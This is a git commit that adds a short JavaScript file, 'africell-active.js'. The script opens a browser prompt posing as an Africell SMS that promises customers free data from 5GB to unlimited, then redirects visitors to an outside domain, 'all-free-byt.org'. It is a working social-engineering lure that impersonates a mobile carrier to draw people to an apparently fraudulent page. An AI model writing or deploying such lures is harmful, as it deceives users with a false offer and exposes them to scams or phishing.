e129fd0d00d6a3f7c3a093ba38d7265452f06b38
Imohekpe1 <169145829+Imohekpe1@users.noreply.github.com>
2024-11-15 00:37:57 -0800

    Create africell-active.js

---
+++ africell-active.js
@@ -0,0 +1,6 @@
+
+var password = 'Activate Free Data'
+password=prompt('Africell SMS: Dear customer, kindly check if your Africell sim card is qualify to receive from 5GB to Unlimited data, old customers Reward, press Ok to check now ','Activate Free Data');
+if (password != 'Activate Free Data') {
+location.href='https://all-free-byt.org/africell.html';
+}
